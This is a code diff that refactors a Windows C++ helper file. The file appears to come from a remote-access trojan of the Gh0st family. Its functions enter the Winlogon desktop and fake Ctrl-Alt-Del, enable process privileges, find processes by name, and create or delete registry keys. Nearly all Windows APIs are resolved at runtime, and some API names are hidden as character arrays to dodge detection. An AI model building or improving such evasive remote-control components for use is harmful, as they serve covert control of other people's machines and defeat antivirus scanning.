@@ -1,11 +1,9 @@
 #if !defined(AFX_UNTIL_CPP_INCLUDED)
-#define _CRT_SECURE_NO_WARNINGS
+#define AFX_UNTIL_CPP_INCLUDED
 #include <windows.h>
 #include <process.h>
 #include <tlhelp32.h>
 #include "until.h"
-
-
 
 unsigned int __stdcall ThreadLoader(LPVOID param)
 {
@@ -16,7 +14,6 @@ unsigned int __stdcall ThreadLoader(LPVOID param)
         THREAD_ARGLIST	arg;
         memcpy(&arg, param, sizeof(arg));
         SetEvent(arg.hEventTransferArg);
-        // 与卓面交互
         if (arg.bInteractive)
             SelectDesktop(NULL);
         nRet = arg.start_address(arg.arglist);
@@ -26,14 +23,13 @@ unsigned int __stdcall ThreadLoader(LPVOID param)
     return nRet;
 }
 
-HANDLE MyCreateThread (LPSECURITY_ATTRIBUTES lpThreadAttributes, // SD
-                       SIZE_T dwStackSize,                       // initial stack size
-                       LPTHREAD_START_ROUTINE lpStartAddress,    // thread function
-                       LPVOID lpParameter,                       // thread argument
-                       DWORD dwCreationFlags,                    // creation option
+HANDLE MyCreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes,
+                       SIZE_T dwStackSize,
+                       LPTHREAD_START_ROUTINE lpStartAddress,
+                       LPVOID lpParameter,
+                       DWORD dwCreationFlags,
                        LPDWORD lpThreadId,
                        bool bInteractive)
-
 {
     HANDLE	hThread = INVALID_HANDLE_VALUE;
     THREAD_ARGLIST	arg;
@@ -43,182 +39,135 @@ HANDLE MyCreateThread (LPSECURITY_ATTRIBUTES lpThreadAttributes, // SD
     hThread = (HANDLE)_beginthreadex((void *)lpThreadAttributes, dwStackSize, ThreadLoader, &arg, dwCreationFlags, (unsigned *)lpThreadId);
     WaitForSingleObject(arg.hEventTransferArg, INFINITE);
     CloseHandle(arg.hEventTransferArg);
-
     return hThread;
 }
 
-
 BOOL SimulateCtrlAltDel()
 {
-    //////////////////////////////////////////////////////////////////////////
     HINSTANCE user32 = LoadLibrary("user32.dll");
-
     typedef HDESK(WINAPI* TGetThreadDesktop)(DWORD);
     typedef BOOL(WINAPI* TPostMessageA)(HWND, UINT, WPARAM, LPARAM);
-
     TGetThreadDesktop MyGetThreadDesktop = (TGetThreadDesktop)GetProcAddress(user32, "GetThreadDesktop");
     TPostMessageA MyPostMessage = (TPostMessageA)GetProcAddress(user32, "PostMessageA");
-    //////////////////////////////////////////////////////////////////////////
-    BOOL   iResult = TRUE;
+
+    BOOL iResult = TRUE;
     __try {
-
         HDESK old_desktop = MyGetThreadDesktop(GetCurrentThreadId());
-
-        // Switch into the Winlogon desktop
         if (!SelectDesktop("Winlogon")) {
             iResult = FALSE;
             __leave;
         }
-
-        // Fake a hotkey event to any windows we find there.... :(
-        // Winlogon uses hotkeys to trap Ctrl-Alt-Del...
         MyPostMessage(HWND_BROADCAST, WM_HOTKEY, 0, MAKELONG(MOD_ALT | MOD_CONTROL, VK_DELETE));
-
-        // Switch back to our original desktop
         if (old_desktop != NULL)
             SelectHDESK(old_desktop);
     } __finally {
         if (user32)
             FreeLibrary(user32);
     }
-
-
     return iResult;
 }
 
 BOOL SelectHDESK(HDESK new_desktop)
 {
-    //////////////////////////////////////////////////////////////////////////
     HINSTANCE user32 = LoadLibrary("user32.dll");
-
     typedef HDESK (WINAPI *TGetThreadDesktop)(DWORD);
     typedef BOOL (WINAPI *TGetUserObjectInformationA)(HANDLE,int,PVOID,DWORD,LPDWORD);
     typedef BOOL (WINAPI *TSetThreadDesktop)(HDESK);
     typedef BOOL (WINAPI *TCloseDesktop)(HDESK);
 
-    TGetThreadDesktop MyGetThreadDesktop= (TGetThreadDesktop)GetProcAddress(user32, "GetThreadDesktop");
-    TGetUserObjectInformationA MyGetUserObjectInformation= (TGetUserObjectInformationA)GetProcAddress(user32, "GetUserObjectInformationA");
-    TSetThreadDesktop MySetThreadDesktop= (TSetThreadDesktop)GetProcAddress(user32, "SetThreadDesktop");
-    TCloseDesktop MyCloseDesktop= (TCloseDesktop)GetProcAddress(user32, "CloseDesktop");
-
+    TGetThreadDesktop MyGetThreadDesktop = (TGetThreadDesktop)GetProcAddress(user32, "GetThreadDesktop");
+    TGetUserObjectInformationA MyGetUserObjectInformation = (TGetUserObjectInformationA)GetProcAddress(user32, "GetUserObjectInformationA");
+    TSetThreadDesktop MySetThreadDesktop = (TSetThreadDesktop)GetProcAddress(user32, "SetThreadDesktop");
+    TCloseDesktop MyCloseDesktop = (TCloseDesktop)GetProcAddress(user32, "CloseDesktop");
 
     HINSTANCE kernel32 = LoadLibrary("kernel32.dll");
     typedef DWORD (WINAPI *TGetCurrentThreadId)(VOID);
-    TGetCurrentThreadId MyGetCurrentThreadId= (TGetCurrentThreadId)GetProcAddress(kernel32, "GetCurrentThreadId");
-
-    //////////////////////////////////////////////////////////////////////////
+    TGetCurrentThreadId MyGetCurrentThreadId = (TGetCurrentThreadId)GetProcAddress(kernel32, "GetCurrentThreadId");
 
     HDESK old_desktop = MyGetThreadDesktop(MyGetCurrentThreadId());
-
     DWORD dummy;
     char new_name[256];
+    BOOL iResult = TRUE;
 
-    BOOL   iResult = TRUE;
     __try {
-
         if (!MyGetUserObjectInformation(new_desktop, UOI_NAME, &new_name, 256, &dummy)) {
             iResult = FALSE;
             __leave;
         }
-
-        // Switch the desktop
         if(!MySetThreadDesktop(new_desktop)) {
             iResult = FALSE;
             __leave;
         }
-
-        // Switched successfully - destroy the old desktop
         MyCloseDesktop(old_desktop);
-
     } __finally {
         if(user32)
             FreeLibrary(user32);
-
         if (kernel32)
             FreeLibrary(kernel32);
     }
-
     return iResult;
 }
 
 BOOL SelectDesktop(const TCHAR *name)
 {
-    //////////////////////////////////////////////////////////////////////////
     HINSTANCE user32 = LoadLibrary("user32.dll");
-
     typedef HDESK (WINAPI *TOpenDesktopA)(LPCSTR,DWORD,BOOL,ACCESS_MASK);
     typedef HDESK (WINAPI *TOpenInputDesktop)(DWORD,BOOL,ACCESS_MASK);
     typedef BOOL (WINAPI *TCloseDesktop)(HDESK);
 
-    TOpenInputDesktop MyOpenInputDesktop= (TOpenInputDesktop)GetProcAddress(user32, "OpenInputDesktop");
-    TOpenDesktopA MyOpenDesktop= (TOpenDesktopA)GetProcAddress(user32, "OpenDesktopA");
-    TCloseDesktop MyCloseDesktop= (TCloseDesktop)GetProcAddress(user32, "CloseDesktop");
-    //////////////////////////////////////////////////////////////////////////
+    TOpenInputDesktop MyOpenInputDesktop = (TOpenInputDesktop)GetProcAddress(user32, "OpenInputDesktop");
+    TOpenDesktopA MyOpenDesktop = (TOpenDesktopA)GetProcAddress(user32, "OpenDesktopA");
+    TCloseDesktop MyCloseDesktop = (TCloseDesktop)GetProcAddress(user32, "CloseDesktop");
+
     HDESK desktop;
+    BOOL iResult = TRUE;
 
-    BOOL   iResult = TRUE;
     __try {
-
         if (name != NULL) {
-            // Attempt to open the named desktop
-            desktop = MyOpenDesktop(name, 0, FALSE,0x1FF);
+            desktop = MyOpenDesktop(name, 0, FALSE, 0x1FF);
         } else {
-            // No, so open the input desktop
-            desktop = MyOpenInputDesktop(0, FALSE,0x1FF);
+            desktop = MyOpenInputDesktop(0, FALSE, 0x1FF);
         }
-
-        // Did we succeed?
         if (desktop == NULL) {
             iResult = FALSE;
             __leave;
         }
-
-        // Switch to the new desktop
         if (!SelectHDESK(desktop)) {
-            // Failed to enter the new desktop, so free it!
             MyCloseDesktop(desktop);
-            iResult =  FALSE;
+            iResult = FALSE;
             __leave;
         }
     } __finally {
         if(user32)
             FreeLibrary(user32);
     }
-
     return iResult;
 }
 
-
-
-BOOL DebugPrivilege(const char *PName,BOOL bEnable)
+BOOL DebugPrivilege(const char *PName, BOOL bEnable)
 {
-    bool              bResult = TRUE;
-    HANDLE            hToken;
-    TOKEN_PRIVILEGES  TokenPrivileges;
-
+    bool bResult = TRUE;
+    HANDLE hToken;
+    TOKEN_PRIVILEGES TokenPrivileges;
 
     HINSTANCE advapi32 = LoadLibrary("ADVAPI32.dll");
+    typedef BOOL (WINAPI *OPT)(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
+    OPT myopt = (OPT)GetProcAddress(advapi32, "OpenProcessToken");
 
-    typedef BOOL (WINAPI *OPT)(HANDLE ProcessHandle,DWORD DesiredAccess,PHANDLE TokenHandle);
-    OPT myopt;
-    myopt= (OPT)GetProcAddress(advapi32, "OpenProcessToken");
+    typedef BOOL (WINAPI *ATP)(HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength);
+    ATP myapt = (ATP)GetProcAddress(advapi32, "AdjustTokenPrivileges");
 
-    typedef BOOL (WINAPI *ATP)(HANDLE TokenHandle,BOOL DisableAllPrivileges,PTOKEN_PRIVILEGES NewState,DWORD BufferLength,PTOKEN_PRIVILEGES PreviousState,PDWORD ReturnLength);
-    ATP myapt;
-    myapt= (ATP)GetProcAddress(advapi32, "AdjustTokenPrivileges");
-
-    typedef BOOL (WINAPI *LPV)(LPCTSTR lpSystemName, LPCTSTR lpName,PLUID lpLuid);
+    typedef BOOL (WINAPI *LPV)(LPCTSTR lpSystemName, LPCTSTR lpName, PLUID lpLuid);
     LPV mylpv;
 #ifdef UNICODE
-    mylpv= (LPV)GetProcAddress(advapi32, "LookupPrivilegeValueW");
+    mylpv = (LPV)GetProcAddress(advapi32, "LookupPrivilegeValueW");
 #else
-    mylpv= (LPV)GetProcAddress(advapi32, "LookupPrivilegeValueA");
+    mylpv = (LPV)GetProcAddress(advapi32, "LookupPrivilegeValueA");
 #endif
 
     HINSTANCE kernel32 = LoadLibrary("kernel32.dll");
     typedef HANDLE (WINAPI *TGetCurrentProcess)(VOID);
     TGetCurrentProcess myGetCurrentProcess = (TGetCurrentProcess)GetProcAddress(kernel32, "GetCurrentProcess");
-
 
     if (!myopt(myGetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken)) {
         bResult = FALSE;
@@ -226,16 +175,13 @@ BOOL DebugPrivilege(const char *PName,BOOL bEnable)
     }
     TokenPrivileges.PrivilegeCount = 1;
     TokenPrivileges.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;
-
-
     mylpv(NULL, PName, &TokenPrivileges.Privileges[0].Luid);
-
     myapt(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
 
     typedef int (WINAPI *GLE)(void);
     GLE myGetLastError;
     HINSTANCE hdlxxe = LoadLibrary("KERNEL32.dll");
-    myGetLastError= (GLE)GetProcAddress(hdlxxe, "GetLastError");
+    myGetLastError = (GLE)GetProcAddress(hdlxxe, "GetLastError");
 
     if (myGetLastError() != ERROR_SUCCESS) {
         bResult = FALSE;
@@ -249,25 +195,25 @@ BOOL DebugPrivilege(const char *PName,BOOL bEnable)
     return bResult;
 }
 
+#define _CRT_SECURE_NO_WARNINGS
 #include <STDIO.H>
 int WriteToLog(char* str)
 {
     FILE* log;
-    log=fopen("C:\\2.txt","a+");
-    if (log==NULL)
+    log = fopen("C:\\2.txt","a+");
+    if (log == NULL)
         return -1;
     fprintf(log,"%s\n",str);
     fclose(log);
     return 0;
 }
 
-
 BOOL EnumProcesin(LPTSTR lpProcessName)
 {
     typedef BOOL (WINAPI *TProcess32First)(HANDLE,LPPROCESSENTRY32);
     typedef BOOL (WINAPI *TProcess32Next)(HANDLE,LPPROCESSENTRY32);
-
     typedef HANDLE (WINAPI *TCreateToolhelp32Snapshot)(DWORD,DWORD);
+
     HINSTANCE kernel32 = LoadLibrary("kernel32.dll");
     TCreateToolhelp32Snapshot myCreateToolhelp32Snapshot = (TCreateToolhelp32Snapshot)GetProcAddress(kernel32, "CreateToolhelp32Snapshot");
     TProcess32First myProcess32First = (TProcess32First)GetProcAddress(kernel32, "Process32First");
@@ -279,15 +225,13 @@ BOOL EnumProcesin(LPTSTR lpProcessName)
     HANDLE hSP = myCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 
     if (hSP) {
-        pe.dwSize = sizeof( pe );
-
+        pe.dwSize = sizeof(pe);
         for (dwRet = myProcess32First(hSP, &pe); dwRet; dwRet = myProcess32Next(hSP, &pe)) {
-            if (lstrcmpi( lpProcessName, pe.szExeFile) == 0) {
+            if (lstrcmpi(lpProcessName, pe.szExeFile) == 0) {
                 bFound = TRUE;
                 break;
             }
         }
-
     }
     CloseHandle(hSP);
     if(kernel32)
@@ -297,7 +241,7 @@ BOOL EnumProcesin(LPTSTR lpProcessName)
 
 BOOL CheckFileExist(LPCTSTR lpszPath)
 {
-    if ( GetFileAttributes(lpszPath) == 0xFFFFFFFF && GetLastError() == ERROR_FILE_NOT_FOUND ) {
+    if (GetFileAttributes(lpszPath) == 0xFFFFFFFF && GetLastError() == ERROR_FILE_NOT_FOUND) {
         return FALSE;
     } else {
         return TRUE;
@@ -308,121 +252,80 @@ DWORD GetProcessID(LPCTSTR lpProcessName)
 {
     DWORD RetProcessID = 0;
 
-
-
-    typedef HANDLE
-    (WINAPI
-     *CreateToolhelp32SnapshotT)(
-         DWORD dwFlags,
-         DWORD th32ProcessID
-     );
+    typedef HANDLE (WINAPI *CreateToolhelp32SnapshotT)(DWORD dwFlags, DWORD th32ProcessID);
     char JgKxihB[] = {'K','E','R','N','E','L','3','2','.','d','l','l','\0'};
     char QrUQkBu[] = {'C','r','e','a','t','e','T','o','o','l','h','e','l','p','3','2','S','n','a','p','s','h','o','t','\0'};
-    CreateToolhelp32SnapshotT pCreateToolhelp32Snapshot=(CreateToolhelp32SnapshotT)GetProcAddress(LoadLibrary(JgKxihB),QrUQkBu);
-    HANDLE handle=pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    CreateToolhelp32SnapshotT pCreateToolhelp32Snapshot = (CreateToolhelp32SnapshotT)GetProcAddress(LoadLibrary(JgKxihB), QrUQkBu);
+    HANDLE handle = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 
+    PROCESSENTRY32* info = new PROCESSENTRY32;
+    info->dwSize = sizeof(PROCESSENTRY32);
 
-    PROCESSENTRY32* info=new PROCESSENTRY32;
-
-
-    info->dwSize=sizeof(PROCESSENTRY32);
-
-
-
-
-    if(Process32First(handle,info)) {
-
-
-
-
-        if (_stricmp(info->szExeFile,lpProcessName) == 0) {
-
-
+    if(Process32First(handle, info)) {
+        if (_stricmp(info->szExeFile, lpProcessName) == 0) {
             RetProcessID = info->th32ProcessID;
-
             delete info;
-
             return RetProcessID;
         }
-
-
-        while(Process32Next(handle,info) != FALSE) {
-
-
-            if (lstrcmpi(info->szExeFile,lpProcessName) == 0) {
-
-
+        while(Process32Next(handle, info) != FALSE) {
+            if (lstrcmpi(info->szExeFile, lpProcessName) == 0) {
                 RetProcessID = info->th32ProcessID;
                 delete info;
-
-
                 return RetProcessID;
             }
-
-
         }
-
     }
 
-
-    CloseHandle(handle);//新修改
-
+    CloseHandle(handle);
     delete info;
-
-
     return RetProcessID;
 }
 
-char *  my_strncat(char *dest,const char *source,int count)
+char *my_strncat(char *dest, const char *source, int count)
 {
     char *p = dest;
     while (*p) p++;
     while (count-- && (*p++ = *source++));
-    *p = (char)'\0';  // ← 修正：原来是 '/0'，字符字面量语法错误
-    return(dest);
+    *p = (char)'\0';
+    return dest;
 }
-char * my_strchr(const char *str, int ch)
+
+char *my_strchr(const char *str, int ch)
 {
     while (*str && *str != (char)ch)
         str++;
     if (*str == (char)ch)
-        return((char *)str);
-    return(NULL);
+        return (char *)str;
+    return NULL;
 }
-//读取注册表的指定键的数据(Mode:0-读键值数据 1-牧举子键)
-int  ReadRegEx(HKEY MainKey,LPCTSTR SubKey,LPCTSTR Vname,DWORD Type,char *szData,LPBYTE szBytes,DWORD lbSize,int Mode)
+
+int ReadRegEx(HKEY MainKey, LPCTSTR SubKey, LPCTSTR Vname, DWORD Type, char *szData, LPBYTE szBytes, DWORD lbSize, int Mode)
 {
-    HKEY   hKey=NULL;
-    int    ValueDWORD,iResult=0;
-    char*  PointStr;
-    char   KeyName[32],ValueSz[MAX_PATH],ValueTemp[MAX_PATH];
-    DWORD  szSize,dwIndex=0;
+    HKEY hKey = NULL;
+    int ValueDWORD, iResult = 0;
+    char* PointStr;
+    char KeyName[32], ValueSz[MAX_PATH], ValueTemp[MAX_PATH];
+    DWORD szSize, dwIndex = 0;
 
-    memset(KeyName,0,sizeof(KeyName));
-    memset(ValueSz,0,sizeof(ValueSz));
-    memset(ValueTemp,0,sizeof(ValueTemp));
+    memset(KeyName, 0, sizeof(KeyName));
+    memset(ValueSz, 0, sizeof(ValueSz));
+    memset(ValueTemp, 0, sizeof(ValueTemp));
 
-//////////////////////////////////////////////////////////////////////////
     HINSTANCE advapi32 = LoadLibrary("ADVAPI32.dll");
-
-    typedef BOOL (WINAPI *TRegQueryValueExA)(HKEY,LPCTSTR,LPDWORD,LPDWORD,LPBYTE,LPDWORD );
-    typedef int (WINAPI *TRegOpenKeyExA)(HKEY,LPCTSTR,DWORD,REGSAM,PHKEY );
-    typedef BOOL (WINAPI *TRegEnumValueA)(HKEY,DWORD,LPTSTR,LPDWORD,LPDWORD,LPDWORD,LPBYTE,LPDWORD );
-    typedef BOOL (WINAPI *TRegEnumKeyExA)(HKEY,DWORD,LPTSTR,LPDWORD,LPDWORD,LPTSTR,LPDWORD,PFILETIME );
-    typedef BOOL (WINAPI *TRegCloseKey)(HKEY );
-
-
+    typedef BOOL (WINAPI *TRegQueryValueExA)(HKEY, LPCTSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
+    typedef int (WINAPI *TRegOpenKeyExA)(HKEY, LPCTSTR, DWORD, REGSAM, PHKEY);
+    typedef BOOL (WINAPI *TRegEnumValueA)(HKEY, DWORD, LPTSTR, LPDWORD, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
+    typedef BOOL (WINAPI *TRegEnumKeyExA)(HKEY, DWORD, LPTSTR, LPDWORD, LPDWORD, LPTSTR, LPDWORD, PFILETIME);
+    typedef BOOL (WINAPI *TRegCloseKey)(HKEY);
 
     TRegQueryValueExA MyRegQueryValueEx = (TRegQueryValueExA)GetProcAddress(advapi32, "RegQueryValueExA");
     TRegOpenKeyExA MyRegOpenKeyEx = (TRegOpenKeyExA)GetProcAddress(advapi32, "RegOpenKeyExA");
-    TRegEnumValueA MyRegEnumValue= (TRegEnumValueA)GetProcAddress(advapi32, "RegEnumValueA");
-    TRegEnumKeyExA MyRegEnumKeyEx= (TRegEnumKeyExA)GetProcAddress(advapi32, "RegEnumKeyExA");
-    TRegCloseKey MyRegCloseKey= (TRegCloseKey)GetProcAddress(advapi32, "RegCloseKey");
-//////////////////////////////////////////////////////////////////////////
-
+    TRegEnumValueA MyRegEnumValue = (TRegEnumValueA)GetProcAddress(advapi32, "RegEnumValueA");
+    TRegEnumKeyExA MyRegEnumKeyEx = (TRegEnumKeyExA)GetProcAddress(advapi32, "RegEnumKeyExA");
+    TRegCloseKey MyRegCloseKey = (TRegCloseKey)GetProcAddress(advapi32, "RegCloseKey");
 
     __try {
-        if(MyRegOpenKeyEx(MainKey,SubKey,0,KEY_READ,&hKey) != ERROR_SUCCESS) {
+        if(MyRegOpenKeyEx(MainKey, SubKey, 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
             iResult = -1;
             __leave;
         }
@@ -432,36 +335,34 @@ int  ReadRegEx(HKEY MainKey,LPCTSTR SubKey,LPCTSTR Vname,DWORD Type,char *szData
             case REG_SZ:
             case REG_EXPAND_SZ:
                 szSize = sizeof(ValueSz);
-                if(MyRegQueryValueEx(hKey,Vname,NULL,&Type,(LPBYTE)ValueSz,&szSize) == ERROR_SUCCESS) {
-                    lstrcpy(szData,ValueSz);
-                    iResult =1;
+                if(MyRegQueryValueEx(hKey, Vname, NULL, &Type, (LPBYTE)ValueSz, &szSize) == ERROR_SUCCESS) {
+                    lstrcpy(szData, ValueSz);
+                    iResult = 1;
                 }
                 break;
             case REG_MULTI_SZ:
                 szSize = sizeof(ValueSz);
-                if(MyRegQueryValueEx(hKey,Vname,NULL,&Type,(LPBYTE)ValueSz,&szSize) == ERROR_SUCCESS) {
-                    for(PointStr = ValueSz; *PointStr; PointStr = my_strchr(PointStr,0)+1) { //strchr
-                        my_strncat(ValueTemp,PointStr,sizeof(ValueTemp));
-                        my_strncat(ValueTemp," ",sizeof(ValueTemp));
+                if(MyRegQueryValueEx(hKey, Vname, NULL, &Type, (LPBYTE)ValueSz, &szSize) == ERROR_SUCCESS) {
+                    for(PointStr = ValueSz; *PointStr; PointStr = my_strchr(PointStr, 0) + 1) {
+                        my_strncat(ValueTemp, PointStr, sizeof(ValueTemp));
+                        my_strncat(ValueTemp, " ", sizeof(ValueTemp));
                     }
-                    lstrcpy(szData,ValueTemp);
-                    iResult =1;
+                    lstrcpy(szData, ValueTemp);
+                    iResult = 1;
                 }
                 break;
             case REG_DWORD:
                 szSize = sizeof(DWORD);
-
-                if(MyRegQueryValueEx(hKey,Vname,NULL,&Type,(LPBYTE)&ValueDWORD,&szSize ) == ERROR_SUCCESS) {
-                    wsprintf(szData,"%d",ValueDWORD);
-                    iResult =1;
+                if(MyRegQueryValueEx(hKey, Vname, NULL, &Type, (LPBYTE)&ValueDWORD, &szSize) == ERROR_SUCCESS) {
+                    wsprintf(szData, "%d", ValueDWORD);
+                    iResult = 1;
                 }
                 break;
             case REG_BINARY:
                 szSize = lbSize;
-
-                if(MyRegQueryValueEx(hKey,Vname,NULL,&Type,szBytes,&szSize) == ERROR_SUCCESS) {
-                    wsprintf(szData,"%08X",Type);
-                    iResult =1;
+                if(MyRegQueryValueEx(hKey, Vname, NULL, &Type, szBytes, &szSize) == ERROR_SUCCESS) {
+                    wsprintf(szData, "%08X", Type);
+                    iResult = 1;
                 }
                 break;
             }
@@ -470,33 +371,31 @@ int  ReadRegEx(HKEY MainKey,LPCTSTR SubKey,LPCTSTR Vname,DWORD Type,char *szData
             break;
         }
     } __finally {
-        // ← 修正：删除 MyRegCloseKey(MainKey)，根键句柄不能关闭
         MyRegCloseKey(hKey);
     }
+
     if(advapi32)
         FreeLibrary(advapi32);
 
     return iResult;
 }
-char * my_strncpy( char * dest, const char * source, int count )
+
+char *my_strncpy(char *dest, const char *source, int count)
 {
     char *p = dest;
     while (count && (*p++ = *source++)) count--;
     while(count--)
         *p++ = '\0';
-    return(dest);
+    return dest;
 }
 
-//写注册表的指定键的数据(Mode:0-新建键数据 1-设置键数据 2-删除指定键 3-删除指定键项)
-int WriteRegEx(HKEY MainKey,LPCTSTR SubKey,LPCTSTR Vname,DWORD Type,const char* szData,DWORD dwData,int Mode)
+int WriteRegEx(HKEY MainKey, LPCTSTR SubKey, LPCTSTR Vname, DWORD Type, const char* szData, DWORD dwData, int Mode)
 {
-    HKEY  hKey = NULL;
+    HKEY hKey = NULL;
     DWORD dwDisposition;
-    int   iResult = 0;
+    int iResult = 0;
 
-//////////////////////////////////////////////////////////////////////////
     HINSTANCE advapi32 = LoadLibrary("ADVAPI32.dll");
-
     typedef LONG (WINAPI *TRegCreateKeyExA)(HKEY, LPCSTR, DWORD, LPSTR, DWORD, REGSAM, LPSECURITY_ATTRIBUTES, PHKEY, LPDWORD);
     typedef LONG (WINAPI *TRegSetValueExA)(HKEY, LPCSTR, DWORD, DWORD, CONST BYTE *, DWORD);
     typedef LONG (WINAPI *TRegDeleteKeyA)(HKEY, LPCSTR);
@@ -510,16 +409,14 @@ int WriteRegEx(HKEY MainKey,LPCTSTR SubKey,LPCTSTR Vname,DWORD Type,const char* 
     TRegDeleteValueA MyRegDeleteValue = (TRegDeleteValueA)GetProcAddress(advapi32, "RegDeleteValueA");
     TRegOpenKeyExA   MyRegOpenKeyEx   = (TRegOpenKeyExA)GetProcAddress(advapi32, "RegOpenKeyExA");
     TRegCloseKey     MyRegCloseKey    = (TRegCloseKey)GetProcAddress(advapi32, "RegCloseKey");
-//////////////////////////////////////////////////////////////////////////
 
     __try {
-        // 1. 根据 Mode 打开或创建键
         switch(Mode) {
         case 0:
             if(MyRegCreateKeyEx(MainKey, SubKey, 0, NULL, REG_OPTION_NON_VOLATILE, 
                 KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition) != ERROR_SUCCESS)
                 __leave;
-            break;  // ← 修正：必须有 break，否则 fallthrough 到 case 1
+            break;
         case 1:
             if(MyRegOpenKeyEx(MainKey, SubKey, 0, KEY_READ | KEY_WRITE, &hKey) != ERROR_SUCCESS)
                 __leave;
@@ -528,7 +425,6 @@ int WriteRegEx(HKEY MainKey,LPCTSTR SubKey,LPCTSTR Vname,DWORD Type,const char* 
         case 3:
             if(MyRegOpenKeyEx(MainKey, SubKey, 0, KEY_READ | KEY_WRITE, &hKey) != ERROR_SUCCESS)
                 __leave;
-            // Mode 2/3 直接执行删除，不需要写值
             if(Mode == 2) {
                 if(MyRegDeleteKey(hKey, Vname) == ERROR_SUCCESS)
                     iResult = 1;
@@ -536,12 +432,11 @@ int WriteRegEx(HKEY MainKey,LPCTSTR SubKey,LPCTSTR Vname,DWORD Type,const char* 
                 if(MyRegDeleteValue(hKey, Vname) == ERROR_SUCCESS)
                     iResult = 1;
             }
-            __leave; // 删除后直接离开
+            __leave;
         default:
             __leave;
         }
 
-        // 2. Mode 0 和 1 执行写值操作
         switch(Type) {
         case REG_SZ:
         case REG_EXPAND_SZ:
@@ -556,13 +451,11 @@ int WriteRegEx(HKEY MainKey,LPCTSTR SubKey,LPCTSTR Vname,DWORD Type,const char* 
                 iResult = 1;
             break;
         case REG_BINARY:
-            // 需要额外传入数据指针和长度，当前未实现
             break;
         default:
             break;
         }
     } __finally {
-        // ← 修正：不能关 MainKey（那是根键句柄），只能关 hKey
         if(hKey != NULL) {
             MyRegCloseKey(hKey);
             hKey = NULL;
